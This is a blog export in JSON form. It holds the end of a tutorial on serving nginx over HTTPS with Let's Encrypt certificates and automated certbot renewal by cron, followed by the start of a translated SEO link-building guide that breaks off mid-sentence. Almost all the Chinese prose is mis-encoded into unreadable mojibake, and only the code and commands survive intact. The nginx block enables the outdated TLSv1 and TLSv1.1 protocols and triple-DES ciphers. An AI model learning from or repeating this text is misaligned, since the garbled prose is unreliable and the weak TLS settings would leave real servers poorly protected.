é€™æ¨£å°±æˆåŠŸå–å¾— Letâ€™s Encrypt çš„æ†‘è­‰äº†ï¼Œè€Œ nginx ç”¨çš„æ†‘è­‰å°±å„²å­˜åœ¨ /etc/letsencrypt/live/blog.gtwang.org/ ç›®éŒ„ä¹‹ä¸‹ï¼Œå…¶ä¸­ fullchain.pem å°±æ˜¯ nginx éœ€è¦æ†‘è­‰ï¼Œè€Œ privkey.pem å‰‡æ˜¯éœ€è¦ä¿è­·å¥½çš„ç§é‘°ï¼Œé—œæ–¼æ†‘è­‰æª”æ¡ˆçš„è©³ç´°èªªæ˜ï¼Œè«‹åƒè€ƒ Certbot çš„èªªæ˜æ–‡ä»¶ã€‚ Certbot é‚„æœ‰æä¾›å¦å¤–ä¸€å€‹ standalone çš„æ–¹å¼ä¾†å‘ Letâ€™s Encrypt å–å¾—æ†‘è­‰ï¼Œé€™ç¨®æ–¹å¼æ˜¯ç”± Certbot å»ºç«‹ä¸€å€‹ç¨ç«‹çš„ç¶²é ä¼ºæœå™¨ï¼Œæä¾› Letâ€™s Encrypt è®€å–é©—è­‰ç”¨çš„è³‡æ–™ï¼Œä¸éé€™æ¨£çš„åšæ³•éœ€è¦ç¶å®š 80 æˆ– 443 é€£æ¥åŸ ï¼Œæ‰€ä»¥é€šå¸¸é‚„æœƒéœ€è¦æš«åœæ—¢æœ‰çš„ç¶²é ä¼ºæœå™¨ï¼Œå°æ–¼ä¸€èˆ¬çš„ç¶²ç«™è€Œè¨€ï¼Œæœƒé€ æˆç¶²ç«™æœ‰å¹¾ç§’é˜çš„æ–·ç·šç¾è±¡ï¼Œæ‰€ä»¥æˆ‘å€‹äººä¸å–œæ­¡é€™æ¨£çš„æ–¹å¼ã€‚ æ¥ä¸‹ä¾†è¦è¨­å®š nginx ä¼ºæœå™¨ï¼Œä½¿ç”¨é€™å€‹æ–°æ†‘è­‰ä¾†æä¾› HTTPS çš„å®‰å…¨åŠ å¯†ç¶²é ã€‚ æ­¥é©Ÿ 8 - è¦è®“ nginx å•Ÿç”¨ HTTPS å®‰å…¨åŠ å¯†ç¶²é ï¼Œåªè¦åŠ ä¸Š SSL ç›¸é—œçš„å¹¾è¡Œè¨­å®šå³å¯ï¼Œå…¶é¤˜çš„è¨­å®šä¿æŒä¸è®Šï¼Œä»¥ä¸‹æ˜¯æˆ‘å€‹äººä½¿ç”¨çš„ nginx ä¼ºæœå™¨è¨­å®š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 server { # å‚¾è½ HTTPS æ¨™æº–åŸ è™Ÿ 443 listen 443; # åŒæ™‚å•Ÿç”¨ IPv6 çš„ HTTPS å®‰å…¨åŠ å¯†ç¶²é  listen [::]:443; server_name blog.gtwang.org; root /var/www/blog.gtwang.org/; index index.php index.html index.htm; # å•Ÿç”¨ SSL ssl on; # è¨­å®š SSL æ†‘è­‰ ssl_certificate /etc/letsencrypt/live/blog.gtwang.org/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/blog.gtwang.org/privkey.pem; # å…¶ä»– SSL é¸é … ssl_session_timeout 5m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # omit SSLv3 because of POODLE (CVE-2014-3566) ssl_ciphers \u0026#39;ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA:ECDHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:ECDHE-ECDSA-DES-CBC3-SHA:ECDHE-RSA-DES-CBC3-SHA:EDH-RSA-DES-CBC3-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA256:AES256-SHA256:AES128-SHA:AES256-SHA:DES-CBC3-SHA:!DSS\u0026#39;; ssl_prefer_server_ciphers on; # ... } ssl_protocols çš„éƒ¨åˆ†è¨˜å¾—è¦ æŠŠSSLv3æ‹¿æ‰ ï¼Œé¿å… POODLE æ”»æ“Šï¼ˆCVE-2014-3566ï¼‰ã€‚ æ­¥é©Ÿ 9 - è¨­å®šå¥½ä¹‹å¾Œï¼Œæª¢æŸ¥ä¸€ä¸‹è¨­å®šæª”æ˜¯å¦æ­£ç¢º 1 service nginx configtest æ­¥é©Ÿ 10 - ç¢ºèªç„¡èª¤ä¹‹å¾Œï¼Œé‡æ–°è¼‰å…¥è¨­å®šæª” 1 service nginx reload é€™æ¨£å°±å®Œæˆ nginx ä¼ºæœå™¨çš„è¨­å®šäº†ï¼Œæ¥è‘—å°±å¯ä»¥é–‹å•Ÿ HTTPS åŠ å¯†çš„ç¶²å€ä¾†æ¸¬è©¦äº†ï¼Œæ­£å¸¸ä¾†èªªï¼Œä½¿ç”¨ Google Chrome ç€è¦½å™¨é–‹å•Ÿè‡ªå·±ä¸»æ©Ÿçš„ HTTPS åŠ å¯†ç¶²å€ï¼Œæ‡‰è©²å°±æœƒé¡¯ç¤ºä¸€å€‹ç¶ è‰²çš„é–é ­ï¼Œé€™æ¨£å°±ä»£è¡¨æˆ‘å€‘å®‰è£çš„ SSL æ†‘è­‰æ˜¯æœ‰æ•ˆçš„ã€‚ Letâ€™s Encrypt çš„æ†‘è­‰ä½¿ç”¨æœŸé™åªæœ‰ä¸‰å€‹æœˆï¼Œåœ¨æ†‘è­‰åˆ°æœŸå‰çš„ä¸€å€‹æœˆå¯ä»¥ä½¿ç”¨ certbot-auto ä¾†æ›´æ–°æ†‘è­‰ï¼Œåœ¨å¯¦éš›æ›´æ–°ä¹‹å‰æˆ‘å€‘å¯ä»¥åŠ å…¥ --dry-run åƒæ•¸ï¼Œå…ˆé€²è¡Œæ¸¬è©¦ã€‚ 1 /opt/letsencrypt/certbot-auto renew --dry-run è‹¥æ¸¬è©¦æ²’å•é¡Œï¼Œå°±å¯ä»¥ä½¿ç”¨æ­£å¼æŒ‡ä»¤ä¾†æ›´æ–° 1 /opt/letsencrypt/certbot-auto renew --quiet --no-self-upgrade è€Œç‚ºäº†æ–¹ä¾¿èµ·è¦‹ï¼Œå¯ä»¥å°‡é€™å€‹æ›´æ–°æŒ‡ä»¤å¯«åœ¨ /opt/letsencrypt/renew.sh æŒ‡ä»¤ç¨¿ä¸­ 1 2 #!/bin/sh /opt/letsencrypt/certbot-auto renew --quiet --no-self-upgrade --post-hook \u0026#34;service nginx reload\u0026#34; é€™è£¡æˆ‘åˆåŠ ä¸Šä¸€å€‹ --post-hook çš„è¨­å®šï¼Œè®“æ†‘è­‰æ›´æ–°å®Œå¾Œï¼Œå¯ä»¥è‡ªå‹•é‡æ–°è¼‰å…¥ nginx ä¼ºæœå™¨çš„è¨­å®šï¼Œè®“æ†‘è­‰ç”Ÿæ•ˆã€‚\næ¥è‘—æŠŠé€™å€‹ /opt/letsencrypt/renew.sh æŒ‡ä»¤ç¨¿å¯«é€² crontab ä¸­\n1 2 # m h dom mon dow command 30 2 * * 0 /opt/letsencrypt/renew.sh å®˜æ–¹çš„å»ºè­°æ˜¯é€™å€‹æŒ‡ä»¤å¯ä»¥ä¸€å¤©åŸ·è¡Œå…©æ¬¡ï¼Œè®“ä¼ºæœå™¨çš„æ†‘è­‰éš¨æ™‚ä¿æŒåœ¨æœ€æ–°çš„ç‹€æ…‹ï¼Œé€™è£¡æˆ‘æ˜¯è¨­å®šè®“ä¼ºæœå™¨æ¯é€±æ—¥å‡Œæ™¨å…©é»åŠé€²è¡Œæ†‘è­‰çš„æª¢æŸ¥èˆ‡æ›´æ–°ï¼ŒCertbot åªæœ‰åœ¨æ†‘è­‰åˆ°æœŸå‰ä¸€å€‹æœˆæ‰æœƒé€²è¡Œæ›´æ–°ï¼Œå¦‚æœæ†‘è­‰å°šæœªåˆ°æœŸï¼Œå°±ä¸æœƒæ›´æ–° ","date":"2022-08-23T00:00:00Z","image":"https://live.staticflickr.com/65535/52305205270_220313b3c4_o.png","permalink":"https://wayneblog.ga/2022-08-23/nginx-ssl-with-lets-encrypt/","title":"nginx è¨­å®š ssl ï¼‹ è‡ªå‹•çºŒç´„ Letâ€™s Encrypt å…è²»åŸŸåè­‰æ›¸"},{"content":" æœ¬æ–‡ç¿»è­¯è‡ªï¼šLINK BUILDING FOR SEO:The Definitive Guide (2022)\né€™æ˜¯ä¸€ç¯‡å®Œæ•´çš„ 2022 å¹´é€£çµå„ªåŒ–æŒ‡å—ã€‚\nå› æ­¤ï¼Œå¦‚æœä½ æƒ³è¦å–å¾—æ¬Šå¨ç¶²ç«™çš„åå‘é€£çµã€‚\nä½ å°‡æœƒåœ¨é€™ç¯‡æ–°æŒ‡å—ä¸­ï¼Œäº«å—æœ¬æ–‡å¯æ“ä½œçš„æŠ€å·§ã€‚\nè®“æˆ‘å€‘å¾€æ·±å…¥å…¶ä¸­å§ã€‚\nç¬¬ 1 ç« ï¼šé€£çµå„ªåŒ–åŸºç¤ åœ¨æœ¬ç« ç¯€ï¼Œæˆ‘å°‡å‘ä½ è§£ç­”æ­¤å•é¡Œï¼šã€Œä»€éº¼æ˜¯é€£çµå»ºç«‹ï¼Ÿã€\nåŒæ™‚ï¼Œæˆ‘ä¹Ÿæœƒå‘ä½ å±•ç¾ç‚ºä½•é€£çµå»ºç«‹ï¼Œåœ¨ 2022 å¹´çš„ä»Šå¤©ä»ç„¶å¾ˆé‡è¦ã€‚\nè®“æˆ‘å€‘é–‹å§‹å§ï¼\nä»€éº¼æ˜¯é€£çµå»ºç«‹ï¼Ÿ ã€Œé€£çµå»ºç«‹ã€æ˜¯ä¸€ç¨®æ‰“é€ å–®å‘è¶…é€£çµï¼ˆåˆååå‘é€£ç¯€ï¼‰ï¼Œåˆ°å¦ä¸€å€‹ç¶²ç«™çš„æ–¹æ³•ã€‚\nå¸Œæœ›è—‰æ­¤æ”¹å–„ç¶²ç«™çš„æœå°‹å¼•æ“èƒ½è¦‹åº¦ã€‚\nå¸¸è¦‹çš„é€£çµå„ªåŒ–ç­–ç•¥åŒ…å«å…§å®¹è¡ŒéŠ·ã€å»ºç«‹æœ‰ç”¨çš„å·¥å…·ã€é›»å­éƒµä»¶æ¨å»£ã€ç ´æé€£çµå„ªåŒ–èˆ‡å…¬å…±é—œä¿‚ã€‚\nç‚ºä»€éº¼é€£çµé€™éº¼é‡è¦ï¼Ÿ è‹¥è¦ç†è§£å®ƒï¼Œä½ å°‡éœ€è¦è·³ä¸Šæ™‚å…‰æ©Ÿï¼Œä¸¦é‡è¿”æ—©æœŸç¶²è·¯æ™‚ä»£çš„ Google ã€‚\nåœ¨éå»çš„æ—¥å­ï¼Œæœå°‹å¼•æ“å¦‚ Yahooï¼èˆ‡ Alta Vista æ˜¯ä¸»è¦æ”¯é…è€…ã€‚\nä»–å€‘æ’åºæœå°‹çµæœçš„æ–¹å¼ï¼Œ100% æ˜¯åŸºæ–¼ç¶²é ä¸Šçš„å…§å®¹\nè¼¸å…¥ï¼šGoogle\nç¾ä»Šä»–å€‘çŸ¥åçš„ PageRank æ¼”ç®—æ³•æ”¹è®Šäº†é€™å ´éŠæˆ²ã€‚\nGoogle ä¸æ˜¯å–®ç´”åˆ†æç¶²é çš„å…§å®¹ï¼Œè€Œæ˜¯æŸ¥çœ‹æœ‰å¤šå°‘äººé€£çµåˆ°è©²é é¢ã€‚\nè€Œä»–å€‘æ˜¯æ­£ç¢ºçš„ã€‚\nåœ¨æ¥è¿‘ 20 å¹´ä»¥å¾Œï¼Œé€£çµä»ç„¶æ˜¯è¡¡é‡ç¶²é å“è³ªçš„æœ€å¥½æ–¹æ³•ã€‚\né€™å°±æ˜¯ç‚ºä½• Google ä»ç„¶å°‡åå‘é€£ç¯€è¦–ç‚ºæ’åçš„ä¿¡è™Ÿä¹‹ä¸€ã€‚\næ­¤å¤–ï¼Œç”±æ–¼ä¼éµæ¼”è¬æ³•çš„æ›´æ–°ï¼ŒGoogle ç¾åœ¨å°ˆæ³¨åœ¨é€£çµçš„å“è³ªï¼ˆè€Œéé€£çµæ•¸é‡ï¼‰\nä½ å¯èƒ½æœƒç–‘æƒ‘ï¼š\nä»€éº¼æ˜¯é«˜å“è³ªçš„é€£çµï¼Œå…·é«”æ˜¯ä»€éº¼ï¼Ÿæˆ‘åˆè©²å¦‚ä½•æ‰“é€ ä»–å€‘ï¼Ÿ\né€™å°±æ˜¯æˆ‘è¦åœ¨ä¸‹ä¸€å€‹ç« ç¯€æ¶µè“‹çš„å…§å®¹ã€‚\nç¹¼çºŒå¾€ä¸‹çœ‹\u0026hellip;\nç¬¬ 2 ç« ï¼šå¦‚ä½•æ‰¾åˆ°é«˜å“è³ªçš„é€£çµ åœ¨æˆ‘å€‘æ·±å…¥é€£çµå„ªåŒ–çš„é€æ­¥ç­–ç•¥å‰ï¼ŒçŸ¥é“ä»€éº¼æ˜¯å¥½ï¼ˆæˆ–å£ï¼‰é€£çµå¾ˆé‡è¦ã€‚\né€™æ¨£ï¼Œä½ å¯ä»¥å°ˆæ³¨åœ¨å„ªåŒ–èƒ½æ”¹å–„ Google æ’åçš„é€£çµã€‚\nå› æ­¤ï¼Œä»¥ä¸‹æ˜¯å¦‚ä½•è¾¨èªå€¼å¾—å„ªåŒ–é€£çµçš„æ–¹æ³•ï¼š\né é¢æ¬Šé‡ è«‹å•èˆ‡ä½ é€£çµçš„é‚£å€‹ç¶²é ï¼Œåœ¨ PageRank ä¸­æ˜¯ä¸æ˜¯å€‹æœ‰åŠ›äººå£«ï¼Ÿ\nå¦‚æœæ˜¯çš„è©±ï¼Œé‚£å°‡æœƒè®“ä½ çš„æ’åæ“æœ‰ä¸€å€‹å·¨å¤§çš„å½±éŸ¿ã€‚\näº‹å¯¦ä¸Šï¼Œå¾å¤šå¹´çš„æ¸¬è©¦ä¸­ï¼Œæˆ‘å·²ç¶“ç™¼ç¾é é¢æ¬Šé‡çš„å‚³éï¼Œå°‡æ¯”ä»»ä½•å…¶ä»–å› ç´ æ›´é‡è¦ã€‚\né€™æ˜¯å› ç‚ºä¾†è‡ªä¸€å€‹æ¬Šå¨æ€§é é¢çš„é€£çµï¼Œå°‡æä¾›æ›´å¤šæ¬Šé‡å€¼ï¼ˆåˆè¢«ç¨±ç‚º PageRankï¼‰çµ¦ä½ çš„ç¶²ç«™ã€‚\nï¼ˆç­†è¨˜ï¼šé›–ç„¶ Google ä¸¦æ²’æœ‰å…¬é–‹åˆ†äº«é—œæ–¼ PageRank çš„è³‡è¨Šï¼Œä»–å€‘ä»ç„¶å°‡å…¶è¦–ç‚ºæ¼”ç®—æ³•çš„åŸºç¤ï¼‰\nä½ å¯ä»¥ä½¿ç”¨ Semrush ï¼Œè¼•æ˜“çš„å¯Ÿçœ‹ PageRank çš„å¤§ç´„æŒ‡æ¨™ã€‚\nåªè¦åœ¨ Semrush å¡«å…¥ç¶²å€ï¼Œä¸¦æŸ¥çœ‹ã€ŒPage Authority Scoreã€æ•¸å€¼ã€‚\nç¶²ç«™æ¬Šé‡ ä¸€å€‹é€£çµçš„å“è³ªï¼ŒåŒæ¨£å—åˆ°è©²ç¶²åŸŸçš„ã€Œç¶²ç«™æ¬Šé‡ã€æ±ºå®šã€‚\næ™®éä¸Šä¾†èªªï¼Œä¸€å€‹ä¾†è‡ªç´ç´„æ™‚å ±çš„é€£çµï¼Œå°‡æœƒæ¯”ä¾†è‡ªä¸€å€‹ç„¡åæ°£éƒ¨è½æ ¼çš„é€£çµï¼Œç”¢ç”Ÿé‚„è¦å¤§çš„å½±éŸ¿åŠ›ã€‚\né›–ç„¶é€™äº›é€£çµå¾ˆé›£å–å¾—ï¼Œä½†å®ƒå€‘ä»ç„¶å€¼å¾—çˆ­å–ã€‚\nåŒç†ï¼ŒSemrush ä¸€æ¨£èƒ½æ´¾ä¸Šç”¨å ´ã€‚\nåœ¨å·¥å…·ä¸­è¼¸å…¥ç¶²åŸŸåç¨±ï¼Œä¸¦æŸ¥çœ‹å®ƒçš„ã€ŒAuthority Scoreã€æ•¸å€¼ã€‚\nç¶²ç«™ç›¸é—œæ€§ ç•¶æˆ‘å€‘æåˆ°é€£çµï¼Œä¸€å€‹ç¶²ç«™çš„æ¬Šé‡å¾ˆé‡è¦ã€‚\nä½†è©²ç¶²ç«™çš„é—œè¯æ€§åŒæ¨£é‡è¦ã€‚\nèˆ‰ä¾‹ä¾†èªªï¼Œå‡è¨­ä½ ç¶“ç‡Ÿä¸€å€‹é—œæ–¼ã€ŒåŸå§‹äººæ¸›è‚¥æ³•ã€çš„ç¶²ç«™ã€‚\nä½ æƒ³è¦å¾ä¸€å€‹æ¬Šå¨æ€§çš„ç¶²ç«™å–å¾—é€£çµ\u0026hellip;.åƒæ˜¯å–®è¼ªè»Šï¼Œé€™æ¨£çš„é€£çµä»ç®—æ•¸å—ï¼Ÿ\næ ¹æ“šä¸€ä½å‰ Googler çš„è¨ªè«‡å…§å®¹ï¼Œçµæœé¡¯ç¤ºä¸¦éå¦‚æ­¤ã€‚\n:::info\nã€Œå¾ä¸€å€‹é«˜ PageRank é é¢å–å¾—çš„é€£çµï¼Œåœ¨éå»é€šå¸¸å¾ˆæœ‰åƒ¹å€¼ã€‚ã€\nã€Œå¦‚ä»Šï¼Œæ¼”ç®—æ³•æ›´æ³¨é‡è©²ç¶²ç«™èˆ‡ä½ å…§å®¹çš„é—œè¯æ€§ã€‚ã€\nã€Œé—œè¯æ€§æ˜¯æ–°çš„ PageRankã€\n:::\nå¤§è‡´ä¸Šï¼Œä½ æœƒæƒ³è¦å¾å…·æ¬Šå¨æ€§çš„ç¶²ç«™å–å¾—é€£çµï¼Œç‰¹åˆ¥æ˜¯è©²ç¶²ç«™èˆ‡ä½ çš„å…§å®¹ï¼Œæ“æœ‰ç›¸è¿‘çš„é—œè¯ã€‚\né é¢ä¸Šé€£çµçš„ä½ç½® è«‹å•ä½ çš„é€£çµï¼Œæ˜¯å¦å…§åµŒåœ¨éƒ¨åˆ†å…§å®¹ä¸­å—ï¼Ÿ\næˆ–æ˜¯åŸ‹åœ¨ç¶²é çš„é å°¾ï¼Ÿ\näº‹å¯¦è­‰æ˜ï¼Œä½ çš„é€£çµåœ¨é é¢ä¸Šçš„ä½ç½®å¾ˆé‡è¦ã€‚\nç‰¹åˆ¥æ˜¯åŸ‹è—åœ¨é é¦–èˆ‡æ¸¬æ””çš„é€£çµï¼Œä¸¦ä¸å¦‚é é¢æ­£æ–‡å€å¡Šçš„é€£çµæœ‰åƒ¹å€¼ã€‚\nç¶²ç«™åº•éƒ¨å‘¢ï¼Ÿä½ æœƒå¸Œæœ›ä½ çš„é€£çµå‡ºç¾åœ¨ç¶²é çš„ä¸»è¦å€å¡Šã€‚\né€£çµæ˜¯å¦ç”±ç·¨è¼¯æ–¹å¼æ”¾ä¸Šçš„ï¼Ÿ ä¸è«–ä½ çš„é€£çµæ˜¯å¦å‡ºç¾åœ¨ç¶²é ï¼Œä½ æ‡‰è©²è©¢å•è‡ªå·±ï¼š\nã€Œæ­¤é€£çµæ˜¯å¦ç”±ç·¨è¼¯æ–¹å¼æ”¾ä¸Šå»çš„ï¼Ÿã€\næ›å¥è©±èªªï¼Œæ˜¯å¦æœ‰äººå°‡è‡ªå·±ç¶²ç«™èˆ‡ä½ çš„ç¶²ç«™é€£çµï¼Œå–®ç´”æ˜¯å› ç‚ºä»–å€‘èªç‚ºä½ çš„ç¶²ç«™å¾ˆè®šï¼Ÿ\nå¦‚æœæ˜¯çš„è©±ï¼Œé€™å°±æ˜¯ä¸€å€‹ç·¨è¼¯é€£çµï¼ˆeditorial linkï¼‰\næˆ–æ˜¯ä½ åœ¨ä¸€å€‹éš¨æ©Ÿç¶²ç«™å‰µé€ å¸³æˆ¶ï¼Œä¸¦åœ¨é‚£é‚Šæ”¾ä¸‹ä¸€å€‹è‡ªå·±ç¶²ç«™çš„åå‘é€£çµï¼Ÿ\né€™å°±ä¸æ˜¯ç·¨è¼¯é€£çµã€‚\nå¦‚ä½ æ‰€æ–™ï¼ŒGoogle æ›´åŠ é‡è¦–ç·¨è¼¯é€£çµã€‚\n:::info\nå¼•è¨€è‡ª Google\nã€Œä»¥éç·¨è¼¯æ–¹å¼æ”¾ä¸Šä¸€å€‹é€£çµï¼Œæˆ–æœªç¶“ç¶²ç«™æ“æœ‰äººåœ¨ç¶²é ä¸Šçš„èªè­‰ï¼Œåˆè¢«ç¨±ç‚ºéè‡ªç„¶é€£çµã€‚ã€\nã€Œå®ƒå¯ä»¥è¢«è¦–ç‚ºé•åæˆ‘å€‘çš„æœå°‹æŒ‡å—ã€\n:::\né€£çµéŒ¨é»æ–‡å­— éŒ¨é»æ–‡å­—æ˜¯ä¸€å€‹å¯è¢«é»æ“Šçš„æ–‡å­—é€£çµå€å¡Šã€‚\näº‹å¯¦è­‰æ˜ï¼ŒGoogle ä½¿ç”¨éŒ¨é»æ–‡å­—ä½œç‚ºæ’åè¨Šè™Ÿã€‚\nèˆ‰ä¾‹ä¾†èªªï¼Œä½ å–å¾—ä¸€å€‹é€£åˆ°ä½ ç¶²ç«™çš„éŒ¨é»æ–‡å­—ï¼šåŸå§‹äººç”œé»\nGoogle çœ‹åˆ°è©²éŒ¨é»æ–‡å­—ï¼Œä¸¦èªªï¼š\næ©\u0026hellip; é€™å€‹ç¶²ç«™ä½¿ç”¨ã€ŒåŸå§‹äººç”œé»ã€éŒ¨é»æ–‡å­—ï¼Œè©²é€£çµå°å‘çš„ç¶²é ä¸€å®šæ˜¯é—œæ–¼ã€ŒåŸå§‹äººç”œé»ã€ã€‚\nç•¶ç„¶ï¼Œå¦‚åŒå…¶ä»– SEO æŠ€å·§ï¼Œé—œéµå­—è±å¯Œçš„éŒ¨é»æ–‡å­—å·²ç¶“è¢«æ¿«ç”¨ã€‚\nç¾ä»Šï¼Œå»ºç«‹ä¸€å¤§å †æº–ç¢ºæè¿°çš„éŒ¨é»æ–‡å­—ï¼Œä»æœƒè¢«è¦–ç‚ºåƒåœ¾å…§å®¹ã€‚\nç°¡çŸ­ä¾†èªªï¼Œæˆ‘ä¸æ¨è–¦é€éé—œéµå­—è±å¯Œçš„éŒ¨é»æ–‡å­—ï¼Œç”¨ä»¥å»ºç«‹åå‘é€£çµã€‚\nå¦‚æœä½ æ˜¯çœŸçš„å¾éŒ¨é»æ–‡å­—å–å¾—åå‘é€£çµï¼Œé‚„æ˜¯å€¼å¾—æ…¶ç¥ã€‚\né€£çµå…±ç¾ ã€Œå…±ç¾ã€æ˜¯æŒ‡æ–‡å­—èˆ‡ç‰‡èªå…±åŒå‡ºç¾åœ¨ä½ çš„é€£çµä¸Šã€‚\nGoogle å¯èƒ½ä½¿ç”¨å…±ç·šä½œç‚ºã€Œå­éŒ¨é»æ–‡å­—ã€(baby anchor text)\nå¦‚æœä½ é€™æ¨£æ€è€ƒï¼Œå°±èƒ½ç†è§£ï¼š\né‚£äº›åœç¹åœ¨é€£çµä¸Šçš„æ–‡å­—ï¼ŒåŒæ¨£æä¾›è©²é é¢çš„ç·šç´¢ã€‚\næ—¢ç„¶å¦‚æ­¤ï¼ŒGoogle åˆæœ‰ä»€éº¼ç†ç”±ä½•ä¸å»ä½¿ç”¨å‘¢ï¼Ÿ\né€£çµæ˜¯å¦ä¾†è‡ªå®¢ä½œæ–‡ç« ï¼Ÿ å¹¾å¹´å‰ï¼ŒGoogle ç«™å‡ºä¾†èªªï¼š\n:::info\nã€Œæœ‰ä»¶äº‹å·²ç¶“ç„¡æ³•ç¹¼çºŒä¸‹å»äº†ï¼šå®¢åº§æ–‡ç« å·²ç¶“çµæŸï¼Œä»–å·²ç¶“è®Šå¾—å¤ªéä½å»‰ã€\nï¼Matt Cuttsï¼Œå‰ Google åƒåœ¾éƒµä»¶åœ˜éšŠä¸»ç®¡\n:::\né€™æ˜¯çœŸçš„å—ï¼Ÿ\næ©\u0026hellip;ä»–å–æ±ºæ–¼ç•¶ä¸‹æ¢ä»¶ã€‚\nä»¥ä¸‹é€™ä¸€äº›ç´…æ——èˆ‰å‹•ï¼Œæœƒä½¿å®¢åº§æ–‡ç« è®Šå¾—æ²’æœ‰åƒ¹å€¼ã€‚\næŸäººä»˜è²»åˆŠç™»æ–‡ç«  æ–‡ç« åŒ…å«å®Œå…¨æ¯”å°çš„éŒ¨é»æ–‡å­— è©²ç¶²ç«™åªç‚ºäº†ç™¼å¸ƒå®¢åº§æ–‡ç« å–®ç¨å­˜åœ¨ è©²ç¶²ç«™èˆ‡ä½ çš„ç¶²ç«™ä¸ç›¸é—œ ä½†å¦‚æœä½ åœ¨ä¸€å€‹å…·æ¬Šå¨æ€§ã€é—œè¯æ€§çš„ç¶²ç«™ï¼Œç™¼å¸ƒä¸€å€‹ä»¤äººé©šè‰·çš„æ–‡ç« å‘¢ï¼Ÿ\nåœ¨æˆ‘çš„ç¶“é©—ï¼Œè©²é€£çµå¯ä»¥å¹«åŠ©ä½ çˆ­å–æ’å\nNofollow vs Dofollow ã€Œrel=\u0026ldquo;nofollow\u0026rdquo;ã€æ˜¯ä¸€å€‹é€£çµæ¨™ç±¤ï¼Œç”¨ä¾†å‘Šè¨´æœå°‹å¼•æ“ï¼šä¸è¦å°‡æ­¤é€£çµç•¶æˆä¸€å€‹ç¶²ç«™èƒŒæ›¸ã€‚\næ˜é¡¯åœ°ï¼Œç•¶åˆ°äº† SEO é ˜åŸŸï¼Œä½ æœƒæƒ³è¦ç›¡å¯èƒ½ï¼Œå–å¾—ä¸€å€‹æ­£å¸¸ã€Œdofollowã€é€£çµã€‚\nç¾åœ¨ï¼Œä½ å¯ä»¥çŸ¥é“å¦‚ä½•è¡¡é‡é€£çµå“è³ªï¼Œæ˜¯æ™‚å€™é–‹å§‹å»ºç«‹ä»–å€‘ã€‚\nç¬¬ 3 ç« ï¼šå¦‚ä½•é€éå…§å®¹è¡ŒéŠ·ï¼Œå–å¾—ä¸–ç•Œç´šçš„é€£çµ å…§å®¹æ˜¯è§£é–è‰¯å¥½åå‘é€£çµçš„é—œéµï¼Œå·²ç¶“ä¸æ˜¯ä»€éº¼ç§˜å¯†äº†ã€‚\nä½†é€™æ¨£èªªå¥½äº†ï¼š\nå–®ç´”ç™¼å¸ƒå…§å®¹ï¼Œä¸¦ä¸æœƒè®“ä½ å–å¾—ä»»ä½•é€£çµã€‚\näº‹å¯¦è­‰æ˜ï¼Œç‰¹å®šé¡å‹çš„å…§å®¹æœ€é©åˆå–å¾—åå‘é€£çµã€‚\nä»¥ä¸‹æ˜¯å››ç¨®å…§å®¹é¡å‹ï¼Œå¹«åŠ©ä½ ç”¢ç”Ÿæ›´å¤šé€£çµï¼š\nä¸€ã€è¦–è¦ºè³‡ç”¢ å®ƒæ˜¯ä»€éº¼ è¦–è¦ºè³‡ç”¢æ˜¯ï¼š\nåœ–ç‰‡ åœ–è¡¨ è³‡è¨Šåœ– è¦–è¦ºå°å‘çš„å…§å®¹èˆ‡åœ–è¡¨ å®ƒç‚ºä»€éº¼æœ‰ç”¨ è¦–è¦ºå…§å®¹è¶…ç´šå®¹æ˜“å–å¾—é€£çµã€‚\nèˆ‰ä¾‹ä¾†èªªï¼Œç•¶ä½ ç™¼å¸ƒä¸€å€‹åœ–ç‰‡åœ¨ä½ çš„ç¶²ç«™ï¼Œä»»ä½•äººåœ¨ä»–å€‘çš„ç¶²ç«™åˆ†äº«æ­¤åœ–ï¼Œç•¶æœƒè®“ä½ å–å¾—åå‘é€£çµã€‚\né€™å€‹å¼·å¤§çš„ã€Œç•¶ä½ åˆ†äº«æˆ‘çš„åœ–ç‰‡ï¼Œè«‹é€£çµæˆ‘çš„ç¶²ç«™ã€é—œä¿‚ï¼Œä¸¦ä¸ä½œç”¨æ–¼ä»»ä½•æ–‡å­—åŸºç¤çš„å…§å®¹ã€‚\nå¯¦éš›ä¾‹å­ å¹¾å¹´å‰æˆ‘åœ¨è‡ªå·±çš„ç¶²ç«™ï¼Œç™¼å¸ƒäº†ä¸€å€‹é—œæ–¼ Google é»æ“Šç‡çš„åœ–è¡¨ã€‚\nç›´åˆ°ç¾ä»Šï¼Œæ­¤åœ–å·²ç¶“è¢«é€£çµæ•¸åæ¬¡ï¼ˆè¨±å¤šä¾†è‡ªè¡ŒéŠ·é ˜åŸŸçš„æ¬Šå¨ç¶²ç«™ï¼‰\nç¢ºå¯¦ï¼Œå³ä½¿æˆ‘ä½¿ç”¨è¡¨æ ¼å‘ˆç¾ï¼Œä»å¯èƒ½å–å¾—é€™äº›é€£çµã€‚\nä½†é€™äº›é€£çµçš„å»ºç«‹ï¼Œæœ‰å¤§éƒ¨ä¸€éƒ¨åˆ†ï¼ˆæˆ‘é ä¼° 75%ï¼‰æ˜¯å› ç‚ºæˆ‘ä»¥è¦–è¦ºæ–¹å¼å‘ˆç¾ã€‚\näº‹å¯¦ä¸Šï¼Œæˆ‘çš„è¨±å¤šé€£çµï¼Œä¾†è‡ªäººå€‘ç›´æ¥å°‡æˆ‘çš„è¦–è¦ºåœ–è¡¨ï¼Œå¼µè²¼åˆ°ä»–å€‘çš„ç¶²ç«™ä¸Šï¼ˆä¸¦ä½œç‚ºä¾†æºé€£å›æˆ‘çš„ç¶²ç«™ï¼‰ã€‚\næœ‰è¶£çš„äº‹ï¼Œç›´åˆ° 2022 